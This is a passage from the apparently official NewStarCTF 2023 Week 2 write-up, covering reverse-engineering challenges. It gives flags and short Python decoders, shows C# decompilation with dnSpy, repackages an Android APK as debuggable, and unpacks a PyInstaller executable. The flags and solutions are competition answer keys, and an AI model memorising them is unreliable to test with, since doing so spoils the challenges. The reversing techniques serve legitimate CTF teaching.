data-src="https://uploader.shimo.im/f/VHJxtZ3myK5JawGr.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="WY6E">发现结果还需要md5加密，编写exp</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="LGEa" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> hashlib</div><div line="EuQZ" data-language="python" class="ql-code-block ql-word-wrap-true">v5 = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span></div><div line="lPs6" data-language="python" class="ql-code-block ql-word-wrap-true">chipher = [<span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x89</span>,</div><div line="Ab6W" data-language="python" class="ql-code-block ql-word-wrap-true">           <span class="hljs-number">0x92</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD1</span>,</div><div line="kEMZ" data-language="python" class="ql-code-block ql-word-wrap-true">           <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x87</span>]</div><div line="wD9V" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="DFC7" data-language="python" class="ql-code-block ql-word-wrap-true">    v5[i] = (~(i ^ <span class="hljs-number">25</span>))&amp;<span class="hljs-number">0xff</span></div><div line="85SZ" data-language="python" class="ql-code-block ql-word-wrap-true">flag = <span class="hljs-string">''</span></div><div line="uPhs" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chipher)):</div><div line="SeOu" data-language="python" class="ql-code-block ql-word-wrap-true">    flag += <span class="hljs-built_in">chr</span>(v5.index((chipher[i])%<span class="hljs-number">256</span>))</div><div line="Lj9w" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(hashlib.md5(flag.encode()).hexdigest())</div></div><p ql-global="true" line="WeWx"><br></p><h1><div ql-global="true" line="mqj3" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>C？C++？</div></h1><ul data-list-style="circle"><li ql-global="true" line="F1IP" class="bullet-item"><strong>考点：</strong>了解C#以及其反编译器dnSpy</li></ul><ul data-list-style="circle"><li ql-global="true" line="kINi" class="bullet-item"><strong>flag：</strong>flag{45dg_ng78_d8b5_1a7d_gh47_kd5b}</li></ul><ul data-list-style="circle"><li ql-global="true" line="O53F" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="RRY9">将 exe拖入到Exeinfo PE中，发现是由C#编译出的程序<span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="672" height="auto" ori-width="672" src="./NewStarCTF 2023 Week2 官方WriteUp_files/PB]5I6T8(ZH]853IQLO07GS.png" ori-height="322" data-src="https://uploader.shimo.im/f/gcoo6Yfbe6fZlerS.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="7Bv5">将程序拖入到dnSpy中进行反编译，找到Main函数，查看主函数逻辑</p><p ql-global="true" line="LHnF"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1920" height="auto" ori-width="1920" src="./NewStarCTF 2023 Week2 官方WriteUp_files/$`N`RQ@4SBK`8UW72HHBRFL.png" ori-height="1029" data-src="https://uploader.shimo.im/f/1wJp7c6l6ddlCpzq.png!thumbnail" crossorigin="anonymous"></span></span></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="917" height="auto" ori-width="917" src="./NewStarCTF 2023 Week2 官方WriteUp_files/43CMDK`]Q9~DN4_[_91TO]S.png" ori-height="538" data-src="https://uploader.shimo.im/f/eD4JxIraj3UKW89v.png!thumbnail" crossorigin="anonymous"></span></span></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="670" height="auto" ori-width="670" src="./NewStarCTF 2023 Week2 官方WriteUp_files/]QJ%T~Z}SR``M37M7]OYIG9.png" ori-height="531" data-src="https://uploader.shimo.im/f/xH4vpHurrLwZOQlo.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="UUcw">根据加密逻辑，进行逆向，编写exp</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="1yX0" data-language="python" class="ql-code-block ql-word-wrap-true">v6 = <span class="hljs-number">35</span></div><div line="jyzf" data-language="python" class="ql-code-block ql-word-wrap-true">j = <span class="hljs-number">0</span></div><div line="vu32" data-language="python" class="ql-code-block ql-word-wrap-true">v10 = [<span class="hljs-number">68</span>,<span class="hljs-number">75</span>,<span class="hljs-number">66</span>,<span class="hljs-number">72</span>,<span class="hljs-number">99</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">78</span>,<span class="hljs-number">83</span>,<span class="hljs-number">74</span>,<span class="hljs-number">91</span>,<span class="hljs-number">86</span>,<span class="hljs-number">35</span>,<span class="hljs-number">39</span>,<span class="hljs-number">77</span>,<span class="hljs-number">85</span>,<span class="hljs-number">44</span>,<span class="hljs-number">89</span>,<span class="hljs-number">47</span>,<span class="hljs-number">92</span>,<span class="hljs-number">49</span>,<span class="hljs-number">88</span>,<span class="hljs-number">48</span>,<span class="hljs-number">91</span>,<span class="hljs-number">88</span>,<span class="hljs-number">102</span>,<span class="hljs-number">105</span>,<span class="hljs-number">51</span>,<span class="hljs-number">76</span>,<span class="hljs-number">115</span>,-<span class="hljs-number">124</span>,<span class="hljs-number">125</span>,<span class="hljs-number">79</span>,<span class="hljs-number">122</span>,-<span class="hljs-number">103</span>]</div><div line="zvkq" data-language="python" class="ql-code-block ql-word-wrap-true">a2 = <span class="hljs-string">"NEWSTAR"</span></div><div line="azKT" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):</div><div line="kTro" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[j + <span class="hljs-number">28</span>] -= (<span class="hljs-built_in">ord</span>(a2[j])//<span class="hljs-number">5</span>) + <span class="hljs-number">10</span></div><div line="Ohbr" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[j + <span class="hljs-number">21</span>] -= j ^ <span class="hljs-number">2</span></div><div line="eMZy" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[j + <span class="hljs-number">14</span>] -= <span class="hljs-number">2</span> * j</div><div line="ZtYk" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[j + <span class="hljs-number">7</span>] -= <span class="hljs-built_in">ord</span>(a2[j]) % <span class="hljs-number">5</span></div><div line="fiij" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[j] -= j ^ -(<span class="hljs-built_in">ord</span>(a2[j]) % <span class="hljs-number">4</span>)</div><div line="SNni" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(v6):</div><div line="Sujp" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[i] -= i</div><div line="1x4Z" data-language="python" class="ql-code-block ql-word-wrap-true">    v10[i] += <span class="hljs-number">32</span></div><div line="xexM" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v10[i]%<span class="hljs-number">256</span>), end=<span class="hljs-string">''</span>)</div></div><p ql-global="true" line="nPSi"><br></p><p ql-global="true" line="TqKV"><br></p><h1><div ql-global="true" line="IcC8" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>AndroDbgme</div></h1><ul data-list-style="circle"><li ql-global="true" line="UlCw" class="bullet-item"><strong>考点：</strong>Java层动调</li></ul><ul data-list-style="circle"><li ql-global="true" line="caJo" class="bullet-item"><strong>flag：</strong>flag{Let_1t_run_@t_f1rs7_m@ybe_th3_b3st}</li></ul><ul data-list-style="circle"><li ql-global="true" line="rcM0" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="v5VP">本题调试即可以得到Flag</p><p ql-global="true" line="vOC7">关于如何调试apk进程，需要在Manifest需要给AndroidManifest.xml设置</p><div class="ql-code-block-container" data-language="plain" spellcheck="false"><div line="PSOh" data-language="plain" class="ql-code-block">android:debuggable="true"</div></div><p ql-global="true" line="L9Hb">使用apktool 工具解包修改manifest<span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="2103" height="auto" ori-width="2103" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(8).png" ori-height="645" data-src="https://uploader.shimo.im/f/SBudh0NCyPV6ZaC6.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="tJC8">重打包回去之后进行签名</p><p ql-global="true" line="Sfu0">先对文件进行对齐</p><blockquote line="lE9D"><div ql-global="true" class="ql-blockquote-item">zipalign -p -f -v 4 input.apk output_unsigned.apk</div></blockquote><p ql-global="true" line="52kC">加签名  其中abc.keystore 是我通过androidstudio生成的签名文件 </p><p ql-global="true" line="xqkn">也可以自行用工具生成，不再赘述</p><p ql-global="true" line="g6Dd"><a class="ql-link" href="https://blog.csdn.net/qq_25844803/article/details/84953332?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">APK反编译、重打包、签名之apktool实现_apktool反编译还是乱码-CSDN博客</a></p><blockquote line="pP5t"><div ql-global="true" class="ql-blockquote-item">apksigner sign --ks abc.keystore  output_unsigned.apk</div></blockquote><p ql-global="true" line="hXUX"><br></p><p ql-global="true" line="jc0x">安装到手机上，以调试模式启动</p><blockquote line="JchH"><div ql-global="true" class="ql-blockquote-item">adb shell am start -D -n com.chick.androdbgme/.MainActivity</div></blockquote><p ql-global="true" line="KxZo"><br></p><p ql-global="true" line="5ArO">用jeb attach上去，得到flag</p><p ql-global="true" class="ql-align-center" line="KSY7"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper cropped"><img class="gallery-image" width="280" height="auto" ori-width="537" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(9).png" ori-height="1156" data-src="https://uploader.shimo.im/f/uALMvd9hmXYMXmV6.png?sm_xform=image%2Fcrop%2Cx_5%2Cy_0%2Cw_530%2Ch_1155%2Fauto-orient%2C1%2Fresize%2Cm_lfit%2Cw_1920%2Fquality%2Cq_75" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="ESHQ"><br></p><p ql-global="true" line="Dm3t"><br></p><h1><div ql-global="true" line="G26D" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>PZthon</div></h1><ul data-list-style="circle"><li ql-global="true" line="h80k" class="bullet-item"><strong>考点：</strong>python打包成的exe、简单运算</li></ul><ul data-list-style="circle"><li ql-global="true" line="EgiV" class="bullet-item"><strong>flag：</strong>flag{Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001}</li></ul><ul data-list-style="circle"><li ql-global="true" line="SIT3" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="V6ol">无壳64位</p><p ql-global="true" line="ZSh0"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1444" height="auto" ori-width="1444" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(10).png" ori-height="917" data-src="https://uploader.shimo.im/f/l8bPQzgRXV0ePxYr.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="QXXS">拖进IDA64分析发现根部分析不动，于是按 shift + F12 找线索，可以发现有很多的Python痕迹，考点就是py打包成的exe</p><p ql-global="true" line="JCiY"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="848" height="auto" ori-width="848" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(11).png" ori-height="528" data-src="https://uploader.shimo.im/f/Eytu8Z8EcaUeOfL8.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="QGwQ">于是去github上寻找解包的工具</p><p ql-global="true" line="cnAR"><a class="ql-link" href="https://github.com/extremecoders-re/pyinstxtractor?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">https://github.com/extremecoders-re/pyinstxtractor</a></p><p ql-global="true" line="iAhl">随后用以该方式解包</p><p ql-global="true" line="scwC"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1687" height="auto" ori-width="1687" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(12).png" ori-height="467" data-src="https://uploader.shimo.im/f/iZz4ssOU3piTdxZI.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="LAjk">在同级目录下可以找到 PZthon.exe_extracted 文件夹，在里面找到 PZthon.pyc，该文件就是python文件的字节码文件，而字节码我们不好分析，需要反编译成python语言来分析，这时候可以用 uncompyle6 pycdc等工具来反编译，不过uncompyle6只支持到py3.8，而该文件是3.9，所以使用pycdc或在线工具反编译得到</p><p ql-global="true" line="aKPj"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="363px" height="auto" ori-width="803" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(13).png" ori-height="791" data-src="https://uploader.shimo.im/f/XUc5uDLVOdm51EVS.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="hYtP">可以发现只是对我们的输入异或了21然后比较，那么我们只需要取出数据再异或21就可以得到明文，Get Flag!</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="GE3z" data-language="python" class="ql-code-block ql-word-wrap-true">enc = [<span class="hljs-number">0x73</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x68</span>]</div><div line="MmIA" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):</div><div line="LBw8" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i] ^ <span class="hljs-number">21</span>), end = <span class="hljs-string">""</span>)</div><div line="k1ed" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="syKM" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># flag{Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001}</span></div></div><p ql-global="true" line="jnao"><br></p></div><script>
function setTransform(el, scale) {
  var prefix = ["ms", "webkit", ""];

  prefix.forEach(function (str) {
    var name = str ? str + "Transform" : "transform";
    el.style[name] = "scale(" + scale + ")";
    el.style[name + "Origin"] = "left center";
  });
}
document.querySelectorAll(".auto-scale").forEach(function (el) {
  var scale = Math.min(el.clientWidth / el.scrollWidth, 1);

  if (scale < 1) {
    setTransform(el, scale);
    el.style.overflow = 'visible';
    el.style.textOverflow = 'inherit';
  }
});
</script><script>
function fixVerticalAlign(el) {
  if (el && el.classList && el.classList.contains('ql-formula-embed')) {
    var contentNode = el.querySelector('.ql-formula-content')
    el.style.marginBottom = '-3px'
    el.style.verticalAlign = 'text-bottom'
    if (contentNode) {
      contentNode.style.verticalAlign = 'bottom'
    }
  }
}
document.querySelectorAll('.ql-blot-gallery-embed').forEach(function (el) {
  while (el && el.tagName !== 'P') {
    fixVerticalAlign(el.nextSibling)
    fixVerticalAlign(el.previousSibling)
    el = el.parentNode
  }
})

// 修复 dataset
document.querySelectorAll('.ql-formula-embed').forEach(function (el) {
  var input = el.querySelector('input');
  el.dataset.value = decodeURIComponent(input && input.value || '');
})
</script>
                <ul class="ql-gallery-contextmenu"><li class="ql-gallery-menu-item">复制图片</li><li class="ql-gallery-menu-item">下载图片</li></ul><div class="ql-link-toolbar ql-popup visible" data-type="code-block" style="left: 408px; top: 1154px;">
      <span class="ql-link-toolbar-button" data-name="fullscreen"></span>
      <span class="ql-link-toolbar-button" data-name="open-link"></span>
      <span class="ql-link-toolbar-button" data-name="preview"></span>
      <span class="ql-link-toolbar-button" data-name="download"></span>
      <span class="ql-link-toolbar-button" data-name="download-audio"></span>
      <span class="ql-link-toolbar-button" data-name="code-block-lang">Plain  Text</span>
    </div><div class="toolbar-tip hidden"><div class="toolbar-format-tip"></div></div><div class="ql-table-of-content" style="top: 50.6667px; height: calc(100% - 66.3333px); width: 218px; left: 0px; margin-left: auto; background: rgb(247, 247, 247); z-index: 100;"><div id="new-directory" class="table-of-content"><div class="doc-directory-menu"><div class="doc-directory-menu-line"></div><div class="doc-directory-menu-line"></div><div class="doc-directory-menu-line"></div></div><div class="new-doc-directory"><div class="doc-directory-title"><span>目录</span><span class="doc-directory-close"><!--?xml version="1.0" encoding="utf-8"?--> <svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.6 15.6"> <path d="M9.2 7.8l6.4-6.4L14.2 0 7.8 6.4 1.4 0 0 1.4l6.4 6.4L0 14.2l1.4 1.4 6.4-6.4 6.4 6.4 1.4-1.4z" fill="#a5a5a5"> </path> </svg> </span></div><div class="doc-directory-content ps ps--active-y" style="padding-right: 1px;"><ul class="doc-directory-list has-heading-4 has-heading-3 has-more-title"><li class="currentParent toc-entry heading-4 header-indent-undefined hasChildren" data-index="0" data-offset="20"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Web</div></li><li class="currentHeader toc-entry heading-3 header-indent-undefined" data-index="1" data-offset="84"><div class="dic-text">游戏高手</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="2" data-offset="1699"><div class="dic-text">Unserialize？</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="3" data-offset="2884"><div class="dic-text">include 0。0</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="4" data-offset="3598"><div class="dic-text">Upload again!</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="5" data-offset="5421"><div class="dic-text">R!!C!!E</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="6" data-offset="6741"><div class="dic-text">ez_sql</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="7" data-offset="8406"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Pwn</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="8" data-offset="8470"><div class="dic-text">stack_migration</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="9" data-offset="9683"><div class="dic-text">canary</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="10" data-offset="10225"><div class="dic-text">ret2libc</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="11" data-offset="11463"><div class="dic-text">secret number</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="12" data-offset="12341"><div class="dic-text">shellcode revenge</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="13" data-offset="13020"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Misc</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="14" data-offset="13084"><div class="dic-text">Jvav</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="15" data-offset="13610"><div class="dic-text">base!</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="16" data-offset="14839"><div class="dic-text">新建Word文档</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="17" data-offset="15708"><div class="dic-text">永不消逝的电波</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="18" data-offset="16450"><div class="dic-text">1-序章</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="19" data-offset="17720"><div class="dic-text">WebShell的利用</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="20" data-offset="18675"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Crypto</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="21" data-offset="18764"><div class="dic-text">broadcast</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="22" data-offset="20020"><div class="dic-text">rotate_xor</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="23" data-offset="20800"><div class="dic-text">halfcandecode</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="24" data-offset="22277"><div class="dic-text">滴啤</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="25" data-offset="23158"><div class="dic-text">不止一个pi</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="26" data-offset="24491"><div class="dic-text">partial decrypt</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="27" data-offset="25079"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Reverse</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="28" data-offset="25143"><div class="dic-text">SMC</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="29" data-offset="26750"><div class="dic-text">AndroGenshin</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="30" data-offset="27852"><div class="dic-text">R4ndom</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="31" data-offset="30052"><div class="dic-text">easy_enc</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="32" data-offset="32209"><div class="dic-text">Petals</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="33" data-offset="33223"><div class="dic-text">C？C++？</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="34" data-offset="35338"><div class="dic-text">AndroDbgme</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="35" data-offset="36783"><div class="dic-text">PZthon</div></li></ul><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px; height: 453px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 186px;"></div></div></div></div></div></div></div>
                <div id="file-page-footer"><div class="sc-chPdSV gLVbAR"><span class="sc-kgoBCf kqIoIJ">四千一百四十三<!-- --> &nbsp;阅<a class="sc-kGXeez liDUmU" href="https://shimo.im/docs/Dy5ekHJhKo0ap5v3/read#">举报</a></span></div><div class="sm-ad-wrapper pos-pc-readonly-doc-bottom" style="max-width: 816px; margin: 15px auto;"></div><div class="sm-ad-wrapper pos-pc-readonly-doc-bottom-2" style="max-width: 816px; margin: 15px auto;"></div></div>
            <div class="ql-demo-screen-back-to-top"></div></div>
        </div>
        <script>
          window.__SHIMO__ = {
            file: {"permissions":{"readable":true,"editable":false,"commentable":false,"manageable":false,"exitable":false,"exportable":true,"collaboratorManageable":false,"adminManageable":false,"outsiderAddable":false,"childFileCreatable":false,"shareModeManageable":false,"teamShareModeManageable":false,"copyable":true,"lockable":false,"unlockable":false,"removable":false,"downloadable":false,"canDuplicate":true,"canUncompress":false,"canPrint":true,"canSaveAsTemplate":true,"canApplyPermission":true,"canRename":false,"canModifyAdvancedPermission":false,"canCustomizeAdvancedPermission":false,"moveable":false,"sheetLockable":false,"passwordShareable":false,"fileAuthSetable":false},"url":"/docs/Dy5ekHJhKo0ap5v3","isDelete":0,"namePinyin":"n2wgfw|'newstarctf'2023'week2'guan'fang'writeup","parentId":5140742122,"passwordProtected":false,"shareCount":0,"shareMode":"readonly","teamId":null,"userId":28110366,"deletedBy":null,"updatedAt":"2023-10-09T13:36:15.000Z","updatedBy":28110366,"createdAt":"2023-08-31T09:40:11.000Z","id":5134285819,"guid":"Dy5ekHJhKo0ap5v3","name":"NewStarCTF 2023 Week2 